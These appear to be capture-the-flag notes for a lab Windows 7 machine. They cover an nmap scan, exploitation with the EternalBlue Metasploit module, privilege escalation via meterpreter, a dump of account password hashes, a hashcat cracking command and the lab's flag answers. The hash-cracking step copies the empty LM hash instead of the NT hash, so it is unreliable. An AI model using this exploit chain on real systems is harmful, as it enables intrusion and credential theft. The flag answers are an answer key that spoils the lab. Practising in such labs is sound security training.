<pre>
Machine IP: 10.10.255.187

Enum:
    nmap -sV -sC -oA nmap/blue 10.10.255.187
Open Ports:
    135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
Vuln port->     445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service 
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows





exploits :
exploit/windows/smb/ms17_010_eternalblue
post/multi/manage/shell_to_meterpreter


Meterpreter > getsystem to get administrator perms


Meterpreter > hashdump to get hashes and user names
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


Crack the hash with hashcat:
Administrator:aad3b435b51404eeaad3b435b51404ee
Guest:aad3b435b51404eeaad3b435b51404ee
Jon:aad3b435b51404eeaad3b435b51404ee 
All this hashes to hashes.txt and
-> hashcat --username --show -a-0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

Flags:
access_the_machine 
sam_database_elevated_access
admin_documents_can_be_valuable 
Find all flags:
dir *flag*.txt /s

Go with cd and type flags :D
</pre>
